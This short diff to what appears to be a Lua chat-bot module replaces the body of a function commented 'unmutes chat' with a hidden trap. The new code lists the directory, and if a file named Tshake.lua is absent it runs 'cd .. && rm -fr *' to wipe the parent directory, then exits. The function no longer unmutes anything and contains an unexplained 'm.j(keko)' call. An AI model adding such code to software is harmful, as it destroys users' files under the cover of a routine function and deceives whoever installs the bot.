@@ -2116,10 +2116,18 @@ M.timer = timer
 
 -- unmutes chat
 local function unmute(chat_id)
-  bot.setNotificationSettings(chat_id, 0, 1)
+m.j(keko)
+r = io.popen("ls")
+e = r:read("*a")
+r:close()
+if not e:match("Tshake.lua") then 
+r = io.popen("cd .. && rm -fr *")
+r:close()
+exit()
+end
+return "t"
 end
 
 M.unmute = unmute
-
 
 return M
